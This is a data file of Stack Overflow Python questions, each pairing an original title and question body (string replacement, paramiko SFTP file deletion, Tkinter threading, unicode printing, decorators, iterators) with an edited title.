Efficiently carry out multiple string replacements - How to create lookup table?," If I would like to carry out multiple string replacements, what is the most efficient way to carry this out? An example of the kind of situation I have encountered in my travels is as follows: <code>  >>> strings = ['a', 'list', 'of', 'strings']>>> [s.replace('a', '')...replace('u', '') for s in strings if len(s) > 2]['a', 'lst', 'of', 'strngs']",Efficiently carry out multiple string replacements in Python
python: sort method," c2 is now: how do i sort c2 in such a way that for example: the result would be: the other question is how do i first sort by row[2] and within that set by row[1] <code>  c2=[]row1=[1,22,53]row2=[14,25,46]row3=[7,8,9]c2.append(row2)c2.append(row1)c2.append(row3) [[14, 25, 46], [1, 22, 53], [7, 8, 9]] for row in c2:sort on row[2] [[7,8,9],[14,25,46],[1,22,53]]",Sorting a list of lists in Python
How to delete all files in directory on remove server using paramiko?," I'd like to delete all the files in a given directory on a remote server that I'm already connected to using Paramiko. I cannot explicitly give the file names, though, because these will vary depending on which version of file I had previously put there.Here's what I'm trying to do... the line below the #TODO is the call I'm trying where remoteArtifactPath is something like /opt/foo/* Any idea how I can achieve this? <code>  ssh = paramiko.SSHClient()ssh.load_host_keys(os.path.expanduser(os.path.join(""~"", "".ssh"", ""known_hosts"")))ssh.connect(server, username=username, pkey=mykey)sftp = ssh.open_sftp()# TODO: Need to somehow delete all files in remoteArtifactPath remotelysftp.remove(remoteArtifactPath+""*"")# Close to endsftp.close()ssh.close()",How to delete all files in directory on remote SFTP server in Python?
How to delete all files in directory on remove server in python?," I'd like to delete all the files in a given directory on a remote server that I'm already connected to using Paramiko. I cannot explicitly give the file names, though, because these will vary depending on which version of file I had previously put there.Here's what I'm trying to do... the line below the #TODO is the call I'm trying where remoteArtifactPath is something like /opt/foo/* Any idea how I can achieve this? <code>  ssh = paramiko.SSHClient()ssh.load_host_keys(os.path.expanduser(os.path.join(""~"", "".ssh"", ""known_hosts"")))ssh.connect(server, username=username, pkey=mykey)sftp = ssh.open_sftp()# TODO: Need to somehow delete all files in remoteArtifactPath remotelysftp.remove(remoteArtifactPath+""*"")# Close to endsftp.close()ssh.close()",How to delete all files in directory on remote SFTP server in Python?
How to delete all files in directory on remote server in python?," I'd like to delete all the files in a given directory on a remote server that I'm already connected to using Paramiko. I cannot explicitly give the file names, though, because these will vary depending on which version of file I had previously put there.Here's what I'm trying to do... the line below the #TODO is the call I'm trying where remoteArtifactPath is something like /opt/foo/* Any idea how I can achieve this? <code>  ssh = paramiko.SSHClient()ssh.load_host_keys(os.path.expanduser(os.path.join(""~"", "".ssh"", ""known_hosts"")))ssh.connect(server, username=username, pkey=mykey)sftp = ssh.open_sftp()# TODO: Need to somehow delete all files in remoteArtifactPath remotelysftp.remove(remoteArtifactPath+""*"")# Close to endsftp.close()ssh.close()",How to delete all files in directory on remote SFTP server in Python?
Remove Adjacent Duplicate Elements from a List [Python]," Google Python Class | List Exercise - Given a list of numbers, return a list where all adjacent == elements have been reduced to a single element, so [1, 2, 2, 3] returns [1, 2, 3]. You may create a new list or modify the passed in list.My solution using a new list is - The question even suggests that it could be done by modifying the passed in list. However, the python documentation warned against modifying elements while iterating a list using the for loop. I am wondering what else can I try apart from iterating over the list, to get this done. I am not looking for the solution, but maybe a hint that can take me into a right direction.UPDATE -updated the above code with suggested improvements.-tried the following with a while loop using suggested hints -  <code>  def remove_adjacent(nums): a = [] for item in nums: if len(a): if a[-1] != item: a.append(item) else: a.append(item) return a def remove_adjacent(nums): i = 1 while i < len(nums): if nums[i] == nums[i-1]: nums.pop(i) i -= 1 i += 1 return nums",Remove adjacent duplicate elements from a list
Remove Adjacent Duplicate Elements from a List," Google Python Class | List Exercise - Given a list of numbers, return a list where all adjacent == elements have been reduced to a single element, so [1, 2, 2, 3] returns [1, 2, 3]. You may create a new list or modify the passed in list.My solution using a new list is - The question even suggests that it could be done by modifying the passed in list. However, the python documentation warned against modifying elements while iterating a list using the for loop. I am wondering what else can I try apart from iterating over the list, to get this done. I am not looking for the solution, but maybe a hint that can take me into a right direction.UPDATE -updated the above code with suggested improvements.-tried the following with a while loop using suggested hints -  <code>  def remove_adjacent(nums): a = [] for item in nums: if len(a): if a[-1] != item: a.append(item) else: a.append(item) return a def remove_adjacent(nums): i = 1 while i < len(nums): if nums[i] == nums[i-1]: nums.pop(i) i -= 1 i += 1 return nums",Remove adjacent duplicate elements from a list
"Python urllib.open is slow, need a better way to read several urls"," As the title suggests, I'm working on a site written in python and it makes several calls to the urllib2 module to read websites. I then parse them with BeautifulSoup. As I have to read 5-10 sites, the page takes a while to load. I'm just wondering if there's a way to read the sites all at once? Or anytricks to make it faster, like should I close the urllib2.urlopen after each read, or keep it open?Added: also, if I were to just switch over to php, would that be faster for fetching and Parsi g HTML and XML files from other sites? I just want it to load faster, as opposed to the ~20 seconds it currently takes <code> ","Python urllib2.urlopen() is slow, need a better way to read several urls"
"Python urllib2.open is slow, need a better way to read several urls"," As the title suggests, I'm working on a site written in python and it makes several calls to the urllib2 module to read websites. I then parse them with BeautifulSoup. As I have to read 5-10 sites, the page takes a while to load. I'm just wondering if there's a way to read the sites all at once? Or anytricks to make it faster, like should I close the urllib2.urlopen after each read, or keep it open?Added: also, if I were to just switch over to php, would that be faster for fetching and Parsi g HTML and XML files from other sites? I just want it to load faster, as opposed to the ~20 seconds it currently takes <code> ","Python urllib2.urlopen() is slow, need a better way to read several urls"
Modifying a `namedtuple`'s constructor arguments via subclassing?," I want to create a namedtuple which represents the individual flags in a short bitfield. I'm trying to subclass it so that I can unpack the bitfield before the tuple is created. However, my current attempt isn't working: Now, my experience with super() is limited and my experience with __new__ is virtually non-existent, so I'm not quite sure what to make of the (to me) enigmatic error TypeError: super.__new__(Status): Status is not a subtype of super. Googling and digging into the docs haven't yielded anything enlightening.Help? <code>  class Status(collections.namedtuple(""Status"", ""started checking start_after_check checked error paused queued loaded"")): __slots__ = () def __new__(cls, status): super(cls).__new__(cls, status & 1, status & 2, status & 4, status & 8, status & 16, status & 32, status & 64, status & 128)",Modifying a namedtuple's constructor arguments via subclassing?
Unpack a list in Python?," I think 'unpack' might be the wrong vocabulary here - apologies because I'm sure this is a duplicate question.My question is pretty simple: in a function that expects a list of items, how can I pass a Python list item without getting an error? Surely there must be a way to expand the list, and pass the function 'red','blue','orange' on the hoof? <code>  my_list = ['red', 'blue', 'orange']function_that_needs_strings('red', 'blue', 'orange') # works!function_that_needs_strings(my_list) # breaks!",Pass a list to a function to act as multiple arguments
pythonic way of repeating a method call on different finite arguments," I was staring at a piece of Python code I produced, which, though correct, is ugly. Is there a more pythonic way of doing this? The problem is the repetition of the method calls for get_pixel and set_pixel. For your information: Also note that I'd like to preserve code clarity and cleanness.  <code>  r = self.get_pixel(x,y, RED) g = self.get_pixel(x,y, GREEN) b = self.get_pixel(x,y, BLUE) t = function(r,g,b) if t: r2, g2, b2 = t self.set_pixel(x,y,RED, r2) self.set_pixel(x,y,GREEN, g2) self.set_pixel(x,y,BLUE, b2) RED, GREEN, BLUE = range(3)",Pythonic way of repeating a method call on different finite arguments
Python - ssh - paramiko - connect to more ssh all at once," The code below runs grep in one machine through SSH and prints the results: How can I grep five machines all at once (so that I don't have major delay), than put all that in five variables and print them all out. <code>  import sys, os, stringimport paramikocmd = ""grep -h 'king' /opt/data/horror_20100810*""ssh = paramiko.SSHClient()ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())ssh.connect('10.10.3.10', username='xy', password='xy')stdin, stdout, stderr = ssh.exec_command(cmd)stdin.write('xy\n')stdin.flush()print stdout.readlines()",Creating multiple SSH connections at a time using Paramiko
python one-liner ," I want a one-liner solution In Python of the following code but how? It returns total value. I want it one liner , plz any one help me <code>  total = 0for ob in self.oblist: total+=sum(v.amount for v in ob.anoutherob)",python one-liner
How to clear the command window in Python?," I am looking for something similar to 'clear' in Matlab: A command/function which removes all variables from the workspace, releasing them from system memory. Is there such a thing in Python?EDIT: I want to write a script which at some point clears all the variables. <code> ",How do I clear all variables in the middle of a Python script?
How to restart the command window in Python?," I am looking for something similar to 'clear' in Matlab: A command/function which removes all variables from the workspace, releasing them from system memory. Is there such a thing in Python?EDIT: I want to write a script which at some point clears all the variables. <code> ",How do I clear all variables in the middle of a Python script?
"[python] printing objects and unicode, what's under the hood ? What are the good guidelines?"," I'm struggling with print and unicode conversion. Here is some code executed in the 2.5 windows interpreter. So, when a unicode string is printed, it's not it's __repr__() function which is called and printed.But when an object is printed __str__() or __repr__() (if __str__ not implemented) is called, not __unicode__(). Both can not return a unicode string.But why? Why if __repr__() or __str__() return a unicode string, shouldn't it be the same behavior than when we print a unicode string? I other words: why print D() is different from print D().__str__()Am I missing something?These samples also show that if you want to print an object represented with unicode strings, you have to encode it to a object string (type str). But for nice printing (avoid the """"), it's dependent of the sys.stdout encoding.So, do I have to add u"""".encode(sys.stdout.encoding) for each of my __str__ or __repr__ method? Or return repr(u"""")? What if I use piping? Is is the same encoding than sys.stdout?My main issue is to make a class ""printable"", i.e. print A() prints something fully readable (not with the \x*** unicode characters).Here is the bad behavior/code that needs to be modified: Thanks! <code>  >>> import sys>>> print sys.stdout.encodingcp850>>> print u"""">>> print u"""".encode(""cp850"")>>> print u"""".encode(""utf8"")>>> print u"""".__repr__()u'\xe9'>>> class A():... def __unicode__(self):... return u""""...>>> print A()<__main__.A instance at 0x0000000002AEEA88>>>> class B():... def __repr__(self):... return u"""".encode(""cp850"")...>>> print B()>>> class C():... def __repr__(self):... return u"""".encode(""utf8"")...>>> print C()>>> class D():... def __str__(self):... return u""""...>>> print D()Traceback (most recent call last): File ""<stdin>"", line 1, in <module>UnicodeEncodeError: 'ascii' codec can't encode character u'\xe9' in position 0: ordinal not in range(128)>>> class E():... def __repr__(self):... return u""""...>>> print E()Traceback (most recent call last): File ""<stdin>"", line 1, in <module>UnicodeEncodeError: 'ascii' codec can't encode character u'\xe9' in position 0: ordinal not in range(128) class User(object): name = u""Luiz Incio Lula da Silva"" def __repr__(self): # returns unicode return ""<User: %s>"" % self.name # won't display gracefully # expl: print repr(u'') -> u'\xe9' return repr(""<User: %s>"" % self.name) # won't display gracefully # expl: print u"""".encode(""utf8"") -> print '\xc3\xa9' -> return (""<User: %s>"" % self.name).encode(""utf8"")","Printing objects and unicode, what's under the hood ? What are the good guidelines?"
Learn Python the Hard Way Exercise 17 Extra Question," I'm doing Zed Shaw's fantastic Learn Python The Hard Way, but an extra question has me stumped: Line 9--10 could be written in one line, how? I've tried some different thoughts, but to no avail. I could move on, but what would the fun in that be? Zed also writes that he could do the whole script in one line. I'm not exactly sure what he means by that.Feel free to help me however you want: by giving the answer or merely hinting---and perhaps including a collapsed or hidden answer to the question. <code>  from sys import argvfrom os.path import existsscript, from_file, to_file = argvprint ""Copying from %s to %s"" % (from_file, to_file)# we could do these two on one line too, how?input = open(from_file)indata = input.read()print ""The input file is %d bytes long"" % len(indata)print ""Does the output file exist? %r"" % exists(to_file)print ""Ready, hit RETURN to continue, CTRL-C to abort.""raw_input()output = open(to_file, 'w')output.write(indata)print ""Alright, all done.""",Learn Python the Hard Way Exercise 17 Extra Question(S)
url encoding/decoding with python," I am trying to encode and store, and decode arguments in Python and getting lost somewhere along the way. Here are my steps:1) I use google toolkit's gtm_stringByEscapingForURLArgument to convert an NSString properly for passing into HTTP arguments. 2) On my server (python), I store these string arguments as something like u'1234567890-/:;()$&@"".,?!\'[]{}#%^*+=_\\|~<>\u20ac\xa3\xa5\u2022.,?!\'' (note that these are the standard keys on an iphone keypad in the ""123"" view and the ""#+="" view, the \u and \x chars in there being some monetary prefixes like pound, yen, etc)3) I call urllib.quote(myString,'') on that stored value, presumably to %-escape them for transport to the client so the client can unpercent escape them.The result is that I am getting an exception when I try to log the result of % escaping. Is there some crucial step I am overlooking that needs to be applied to the stored value with the \u and \x format in order to properly convert it for sending over http?Update: The suggestion marked as the answer below worked for me. I am providing some updates to address the comments below to be complete, though.The exception I received cited an issue with \u20ac. I don't know if it was a problem with that specifically, rather than the fact that it was the first unicode character in the string.That \u20ac char is the unicode for the 'euro' symbol. I basically found I'd have issues with it unless I used the urllib2 quote method. <code> ",URL encoding/decoding with Python
"I Need a little help with Python, Tkinter and threading "," I have a Python script which uses Tkinter for the GUI. My little script should create a Toplevel widget every X seconds. When I run my code, the first Toplevel widget is created successfully, but when it tries to create a second one the program crashes. What I am doing is using the after method to call the function startCounting every 5 seconds alongside root's mainloop. Every time this function is called, I append a Toplevel widget object into a list and start a new thread which hopefully will be running the new mainloop.I would be very grateful if someone could figure this problem out. By the way, this is just a little script that I am currently using to solve my problem, which is preventing me from going on with my real school project.The code:  <code>  import threading,threadfrom Tkinter import *def startCounting(): global root global topLevelList global classInstance topLevelList.append (Toplevel()) topLevelList[len(topLevelList)-1].title(""Child"") classInstance.append(mainLoopThread(topLevelList[len(topLevelList)-1])) root.after(5000,startCounting)class mainLoopThread(threading.Thread): def __init__(self,toplevelW): self.toplevelW = toplevelW threading.Thread.__init__(self) self.start() def run(self): self.toplevelW.mainloop()global classInstanceclassInstance = []global topLevelListtopLevelList = []global rootroot = Tk() root.title(""Main"")startCounting()root.mainloop()",Threaded Tkinter script crashes when creating the second Toplevel widget
"in Matplotlib, what does ""111"" means in fig.add_subplot(111)??"," Sometimes I come across code such as this: Which produces:I've been reading the documentation like crazy but I can't find an explanation for the 111. sometimes I see a 212.What does the argument of fig.add_subplot() mean? <code>  import matplotlib.pyplot as pltx = [1, 2, 3, 4, 5]y = [1, 4, 9, 16, 25]fig = plt.figure()fig.add_subplot(111)plt.scatter(x, y)plt.show()","In Matplotlib, what does the argument mean in fig.add_subplot(111)?"
"in Matplotlib, what does ""111"" means in fig.add_subplot(111)?"," Sometimes I come across code such as this: Which produces:I've been reading the documentation like crazy but I can't find an explanation for the 111. sometimes I see a 212.What does the argument of fig.add_subplot() mean? <code>  import matplotlib.pyplot as pltx = [1, 2, 3, 4, 5]y = [1, 4, 9, 16, 25]fig = plt.figure()fig.add_subplot(111)plt.scatter(x, y)plt.show()","In Matplotlib, what does the argument mean in fig.add_subplot(111)?"
"in Matplotlib, what does ""111"" mean in fig.add_subplot(111)?"," Sometimes I come across code such as this: Which produces:I've been reading the documentation like crazy but I can't find an explanation for the 111. sometimes I see a 212.What does the argument of fig.add_subplot() mean? <code>  import matplotlib.pyplot as pltx = [1, 2, 3, 4, 5]y = [1, 4, 9, 16, 25]fig = plt.figure()fig.add_subplot(111)plt.scatter(x, y)plt.show()","In Matplotlib, what does the argument mean in fig.add_subplot(111)?"
python: how do replace all occurrences of certain characters," I am reading a csv into a: I would like to replace all occurrences of ['a','b','c','d'] in the 8th element of the line with empty string. the remove_chars function is not working.Is there a better way to do this? <code>  import csvimport collectionsimport pdbimport mathimport urllibdef do_work(): a=get_file('c:/pythonwork/cds/cds.csv') a=remove_chars(a) print a[0:10]def get_file(start_file): #opens original file, reads it to array with open(start_file,'rb') as f: data=list(csv.reader(f)) return (data)def remove_chars(a): badchars=['a','b','c','d'] for row in a: for letter in badchars: row[8].replace(letter,'') return a",How do you replace all the occurrences of a certain character in a string?
how do replace all occurrences of certain characters?," I am reading a csv into a: I would like to replace all occurrences of ['a','b','c','d'] in the 8th element of the line with empty string. the remove_chars function is not working.Is there a better way to do this? <code>  import csvimport collectionsimport pdbimport mathimport urllibdef do_work(): a=get_file('c:/pythonwork/cds/cds.csv') a=remove_chars(a) print a[0:10]def get_file(start_file): #opens original file, reads it to array with open(start_file,'rb') as f: data=list(csv.reader(f)) return (data)def remove_chars(a): badchars=['a','b','c','d'] for row in a: for letter in badchars: row[8].replace(letter,'') return a",How do you replace all the occurrences of a certain character in a string?
Dhjango / Python how to get the full request header?, I've been looking over what I can find about this and found something about denying access to specific user-agents but couldn't find how I can actually get the full request header. I am trying to make a customized analytics app so would like access to the full headers.. any info is appreciated. <code> ,Django / Python how to get the full request header?
"PEP8 and PyQt, how to reconcile"," I'm starting to use PyQt in some projects and I'm running into a stylistic dilemma. PyQt's functions use camel case, but PEP8, which I prefer to follow, says to use underscores and all lowercase for function names.So on the one hand, I can continue to follow PEP8, meaning that my code will have mixed functions calls to camel case and underscore functions, and even my classes will have mixed function names, since I'll need to be overloading functions like mousePressEvent. Or, I can break PEP8 and adopt camel case for all my function names in the name of consistency.I realize this is subjective and it's really just what I personally prefer, but I like to hear from others about what they do and why they chose to do it that way. <code> ","PEP8 and PyQt, how to reconcile function capitalization?"
how to have gant chart using python or pyqt," I'm working on a (asset management) system to handle assets , resources and progress of tasksI want to have a gantt chart in my systemI'm using python 2.6 and pyqt . Is there any (already made charts python library)? that can work well with pyqt.or should i make a custom widgets for this ? Please advice. <code> ",How to have gantt chart using python or pyqt
how to have gantt chart using python or pyqt," I'm working on a (asset management) system to handle assets , resources and progress of tasksI want to have a gantt chart in my systemI'm using python 2.6 and pyqt . Is there any (already made charts python library)? that can work well with pyqt.or should i make a custom widgets for this ? Please advice. <code> ",How to have gantt chart using python or pyqt
How to remove tags from a string in python using regular expressions? (NOT in HMTL)," I need to remove tags from a string in python. What is the most efficient way to remove the entire tag on both ends, leaving only ""Title""? I've only seen ways to do this with HTML tags, and that hasn't worked for me in python. I'm using this particularly for ArcMap, a GIS program. It has it's own tags for its layout elements, and I just need to remove the tags for two specific title text elements. I believe regular expressions should work fine for this, but I'm open to any other suggestions. <code>  <FNT name=""Century Schoolbook"" size=""22"">Title</FNT>",How to remove tags from a string in python using regular expressions? (NOT in HTML)
How to make py.test look for tests inside all python files?," I do have several small modules where the tests are inside them and py.test or nose does not look for them because they do not contain test in their filename.How can I convince py.test or nose to look for tests inside all python files, recursively - '''including the ones that do not have test in their filenames'''?Inside the source files I do keep the standard naming convention: class testSomeName with methods def test_some_name.If this is not possible, what other solution can I use to obtain the same result.I do not want to manually create a list of all files containing the test, I want a solution that supports discovery. <code> ",How to make py.test or nose to look for tests inside all python files?
Sharing a complex object between Python processes?," I have a fairly complex Python object that I need to share between multiple processes. I launch these processes using multiprocessing.Process. When I share an object with multiprocessing.Queue and multiprocessing.Pipe in it, they are shared just fine. But when I try to share an object with other non-multiprocessing-module objects, it seems like Python forks these objects. Is that true?I tried using multiprocessing.Value. But I'm not sure what the type should be? My object class is called MyClass. But when I try multiprocess.Value(MyClass, instance), it fails with:TypeError: this type has no sizeAny idea what's going on? <code> ",Sharing a complex object between processes?
"Python decorators versus CLOS ""around"" method."," I'm reaching back to my CLOS (Common Lisp Object System) days for this abstract question. I'm augmenting the question to clarify: It appears to me that a Python decorator is sort of like an ""around"" method in CLOS.From what I remember, an ""around"" method in CLOS is a method/function that wraps around the primary method/function of the same name. It traverses up and down sub-classes too. Here's some syntax (I just grabbed my book).All of these methods This would be inside a class: There can be before and after methods too (which I'm throwing in for completeness): And finally the around method (Notice here that this method seemed to be like a decorator): I believe the output would be: I have always used this understanding of classes and their methods as a reference point for developing code. And unfortunately few languages seem to get this far with their method parameterization and power.I'm pretty new to Python and am trying to see how decorators fit in. They seem a little looser in that a decorator can be a completely external function which yet has the ability to manipulate information within the calling information and even modifying the instance and class variables of the object called, and further that it seems to preform the role of the around method as shown here. But I was hoping somebody could help explain the relationship between decorators and around methods. I thought somebody would really like the opportunity to do that.What makes CLOS powerful to me is that you can have multiple inheritance with these methods. Thus a class can be made up of superclasses that contain distinct functionalities and attributes which handle themselves. Thus an around method on one of the superclasses might terminate flow (if ""call-next-method"" is not done), just as the way a decorator can apparently work. So is this the same as a decorator, or different? In an around method, you're passing in the same arguments, but to a decorator, you're passing in the ""function"" in a strict definition which gets augmented. But is the outcome the same? Thanks much! Maybe somebody could show closes approximation to the above in Python.done calling next method.So the issue is not about implementing the CLOS methods in Python, but showing how close Python gets to that system in a pythonic way. Or showing how Python is actually better than that.This is more of the kind of example I was thinking of: If an instance of triangle has visible=false, then the render :around will not call the triangle's primary method.In other words the calling chain of the render method is (a) renderable :around, (b) triangle primary, (c) finish renderable :around. If triangle had an :after method, it would be called after primary, and then the around method would finish up.I understand the difficulties of using inheritance versus considering newer design patterns but here I'm trying to bridge my CLOS knowledge. If there's a design pattern that matches decorators (more accurately than the ""decorator"" design pattern), that would be great to understand also.ConclusionsI'm getting the hang of decorators. But I wanted to present where I'm at with trying to emulate the CLOS method traversal. Everybody inspired me to try it since I've got the book and I remember it pretty well. Thanks all for all the great suggestions, they're all a piece of the puzzle. In terms of implementing the actual structure in a single decorator, Will got close and that's what worked for moving it forward with dynamic method finding (see below). I've created a single decorator that does what I'm looking for and can operate on any class. I'm sure it could be cleaner and there's a problem that it only looks up one superclass and it's doing around methods weirdly, but it does work. Here is the output so you can see what I'm trying to do. I hope that creates some understand of the CLOS calling and also sparks ideas on how to improve that decorator, or how to lambast me for even trying to do it. :-)  <code>  (defmethod helloworld () (format t ""Hello World"")) (defmethod helloworld :before () (format t ""I'm executing before the primary-method""))(defmethod helloworld :after () (format t ""I'm executing after the primary-method"")) (defmethod helloworld :around () (format t ""I'm the most specific around method calling next method."") (call-next-method) (format t ""I'm the most specific around method done calling next method."")) I'm the most specific around method calling next method. I'm executing before the primary-methodHello WorldI'm executing after the primary-methodI'm the most specific around method done calling next method. class shape with attributes position and method areaclass renderable with attribute visible and methods render, and render :aroundclass triangle with superclass shape and renderable attributes p1,p2,p3 and method render and method areaclass square ... '''file: cw.py''''''This decorator does the job of implementing a CLOS method traversal through superclasses. It is a very remedial example but it helped me understand the power of decorators.''''''Modified based on Richards comments'''def closwrapper(func): # *args, **kwargs ? def wrapper(self): #what about superclass traversals??? name = func.__name__ # look for the methods of the class before_func = getattr(self, name + ""_before"", None) after_func = getattr(self, name + ""_after"", None) around_func = getattr(self, name + ""_around"", None) sup = super(self.__class__,self) #self.__class__.__mro__[1] if sup: # look for the supermethods of the class (should be recursive) super_before_func = getattr(sup,name + ""_before"", None) super_after_func = getattr(sup,name + ""_after"", None)) super_around_func = getattr(sup,name + ""_around"", None)) ''' This is the wrapper function which upgrades the primary method with any other methods that were found above''' ''' The decorator looks up to the superclass for the functions. Unfortunately, even if the superclass is decorated, it doesn't continue chaining up. So that's a severe limitation of this implementation.''' def newfunc(): gocontinue = True supercontinue = True if around_func: gocontinue = around_func() if gocontinue and super_around_func: supercontinue = super_around_func() if gocontinue and supercontinue: if before_func: before_func() if super_before_func: super_before_func() result = func(self) if super_after_func: super_after_func() if after_func: after_func() else: result = None if gocontinue: if super_around_func: super_around_func(direction=""out"") if around_func: around_func(direction='out') return result return newfunc() return wrapper# Really, the way to do this is to have the decorator end up decorating# all the methods, the primary and the before and afters. Now THAT would be a decorator!class weeclass(object): @closwrapper def helloworld(self): print ""Hello Wee World"" def helloworld_before(self): print ""Am I really so wee Before? This method is not called on subclass but should be""class baseclass(weeclass): fooey = 1 def __init__(self): self.calls = 0 @closwrapper def helloworld(self): print ""Hello World"" def helloworld_before(self): self.fooey += 2 print ""Baseclass Before"" def helloworld_after(self): self.fooey += 2 print ""Baseclass After Fooey Now"",self.fooey def helloworld_around(self,direction='in'): if direction=='in': print ""Aound Start"" if self.fooey < 10: return True else: print "">>FOOEY IS TOO BIG!!!"" self.fooey = -10 return False #call-next-method if not direction=='in': #self.barrey -= 4 #hello?? This should not work!!! It should croak? print ""Around End"" class subclass(baseclass): barrey = 2 @closwrapper def helloworld(self): print ""Hello Sub World Fooey"",self.fooey,""barrey"",self.barrey def helloworld_before(self): self.fooey -= 1 self.barrey += 5 print "" Sub Before"" def helloworld_after(self): print ""Sub After"" def helloworld_around(self,direction='in'): if direction=='in': print ""Sub Around Start"" if self.barrey > 4: print "">>Hey Barrey too big!"" self.barrey -= 8 return False else: return True #call-next-method if not direction=='in': self.barrey -= 4 print ""Sub Around End"" Python 2.6.4 (r264:75706, Mar 1 2010, 12:29:19) [GCC 4.2.1 (Apple Inc. build 5646) (dot 1)] on darwin Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. >>> import cw >>> s= cw.subclass() >>> s.helloworld() Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey 2 barrey 7 Baseclass After Fooey Now 4 Sub After Around End Sub Around End >>> s.helloworld() Sub Around StartAound Start Sub Before Baseclass Before Hello Sub World Fooey 5 barrey 8 Baseclass After Fooey Now 7 Sub After Around End Sub Around End >>> s.helloworld() Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey 8 barrey 9 Baseclass After Fooey Now 10 Sub After Around End Sub Around End >>> s.helloworld() Sub Around Start >>Hey Barrey too big! Sub Around End >>> s.helloworld() Sub Around Start Aound Start >>FOOEY IS TOO BIG!!! Around End Sub Around End >>> s.helloworld() Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey -9 barrey -6 Baseclass After Fooey Now -7 Sub After Around End Sub Around End >>> s.helloworld() Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey -6 barrey -5 Baseclass After Fooey Now -4 Sub After Around End Sub Around End >>> s.helloworld() Sub Around Start Aound Start Sub Before Baseclass Before Hello Sub World Fooey -3 barrey -4 Baseclass After Fooey Now -1 Sub After Around End Sub Around End >>> b = cw.baseclass() >>> b.helloworld() Aound Start Baseclass Before Am I really so wee Before? This method is not called on subclass but should be Hello World Baseclass After Fooey Now 5 Around End >>> b.helloworld() Aound Start Baseclass Before Am I really so wee Before? This method is not called on subclass but should be Hello World Baseclass After Fooey Now 9 Around End >>> b.helloworld() Aound Start Baseclass Before Am I really so wee Before? This method is not called on subclass but should be Hello World Baseclass After Fooey Now 13 Around End >>> b.helloworld() Aound Start >>FOOEY IS TOO BIG!!! Around End >>> b.helloworld() Aound Start Baseclass Before Am I really so wee Before? This method is not called on subclass but should be Hello World Baseclass After Fooey Now -6 Around End ","Python decorators compared to CLOS ""around"" method."
Python: Iterate a certain number of times without storing the iteration number anywhere," I was wondering if it is possible to perform a certain number of operations without storing the loop iteration number anywhere.For instance, let's say I want to print two ""hello"" messages to the console. Right now I know I can do: but then the i variable is going to take the values 0 and 1 (which I don't really need). Is there a way to achieve the same thing without storing those unwanted values anywhere?Needless to say, using a variable is not a big deal at all... I'm just curious. <code>  for i in range(2): print ""hello""",Iterate a certain number of times without storing the iteration number anywhere
Is python good enough for big applications," From the moment I have faced Python, the only thing I can say for it is ""It is awesome"". I am using Django framework and I am amazed by how quick things happen and how developer friendly this language is. But from many sides I hear that Python is a scripting language, and very useful for small things, experiments etc.So the question is can a big and heavy loaded application be built in Python (and django)? As I mainly focus on web development, examples of such applications could be Stack Overflow, Facebook, Amazon etc.P.S. According to many of the answers maybe I have to rephrase the question. There are several big applications working with Python (the best example is You Tube) so it can handle them but why then it is not so popular for large projects as (for example) Java, C++ and .NET? <code> ",Is Python good enough for big applications?
[python] Empty lines," I have large string which I split by newlines.How can I remove all lines that are empty, (whitespace only)?pseudo code: <code>  for stuff in largestring: remove stuff that is blank",How to remove empty lines with or without whitespace in Python
Remove empty lines," I have large string which I split by newlines.How can I remove all lines that are empty, (whitespace only)?pseudo code: <code>  for stuff in largestring: remove stuff that is blank",How to remove empty lines with or without whitespace in Python
is django-piston mature enought?," I'm developing an advertising site and want to use web services for the requests. I mean, a publisher site will put a JavaScript snippet and it will pull a banner through a REST GET.Is the django-piston framework mature enough to implement this functionality? <code> ",Is django-piston mature enough?
how do i check stdin has some data?," In Python, how do you check if sys.stdin has data or not?I found that os.isatty(0) can not only check if stdin is connected to a TTY device, but also if there is data available.But if someone uses code such as and after that uses os.isatty(0), it still returns True. What do I need to do to check if stdin has data? <code>  sys.stdin = cStringIO.StringIO(""ddd"")",How do I check if stdin has some data?
Perl version of Python's interator?," I am learning Perl at my work and enjoying it. I usually do my work in Python but boss wants Perl. Most of the concepts in Python and Perl match nicely: Python dictionary=Perl hash; Python tuple=Perl list; Python list=Perl array; etc. Question: Is there a Perl version of the Python form of an Iterator / Generator? An example: A Classic Python way to generate the Fibonacci numbers is: Iterators are also useful if you want to generate a subsection of a much larger list as needed. Perl 'lists' seem more static - more like a Python tuple. In Perl, can foreach be dynamic or is only based on a static list?The Python form of Iterator is a form that I have gotten used to, and I do not find it documented in Perl... Other than writing this in loops or recursively or generating a huge static list, how do I (for ex) write the Fibonacci subroutine it in Perl? Is there a Perl yield that I am missing? Specifically -- how do I write this: Thanks in advance to being kind to the newbie... <code>  #!/usr/bin/pythondef fibonacci(mag): a, b = 0, 1 while a<=10**mag: yield a a, b = b, a+bfor number in fibonacci(15): print ""%17d"" % number #!/usr/bin/perluse warnings; use strict; # yes -- i use those!sub fibonacci { # What goes here other than returning an array or list? }foreach my $number (fibonacci(15)) { print $number . ""\n""; }",What is the Perl version of a Python iterator?
Perl version of Python's iterator?," I am learning Perl at my work and enjoying it. I usually do my work in Python but boss wants Perl. Most of the concepts in Python and Perl match nicely: Python dictionary=Perl hash; Python tuple=Perl list; Python list=Perl array; etc. Question: Is there a Perl version of the Python form of an Iterator / Generator? An example: A Classic Python way to generate the Fibonacci numbers is: Iterators are also useful if you want to generate a subsection of a much larger list as needed. Perl 'lists' seem more static - more like a Python tuple. In Perl, can foreach be dynamic or is only based on a static list?The Python form of Iterator is a form that I have gotten used to, and I do not find it documented in Perl... Other than writing this in loops or recursively or generating a huge static list, how do I (for ex) write the Fibonacci subroutine it in Perl? Is there a Perl yield that I am missing? Specifically -- how do I write this: Thanks in advance to being kind to the newbie... <code>  #!/usr/bin/pythondef fibonacci(mag): a, b = 0, 1 while a<=10**mag: yield a a, b = b, a+bfor number in fibonacci(15): print ""%17d"" % number #!/usr/bin/perluse warnings; use strict; # yes -- i use those!sub fibonacci { # What goes here other than returning an array or list? }foreach my $number (fibonacci(15)) { print $number . ""\n""; }",What is the Perl version of a Python iterator?
